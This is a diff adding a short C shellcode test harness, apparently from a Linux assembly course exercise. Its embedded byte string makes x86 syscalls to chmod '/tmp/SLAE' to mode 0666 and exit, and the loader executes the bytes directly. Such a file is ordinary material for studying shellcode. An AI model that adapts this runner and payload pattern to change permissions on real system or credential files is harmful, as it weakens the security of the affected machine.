@@ -1,0 +1,14 @@
+#include "stdio.h"
+
+int main(int argc, char *argv[])
+{
+unsigned char shellcode[] =
+"\x99\x6a\x0f\x58\x52\xe8\x0a\x00\x00\x00\x2f\x74\x6d\x70\x2f"
+"\x53\x4c\x41\x45\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd\x80\x6a"
+"\x01\x58\xcd\x80";
+
+printf("Length: %d\n",strlen(shellcode));
+(*(void(*)()) shellcode)();
+
+return 0;
+}
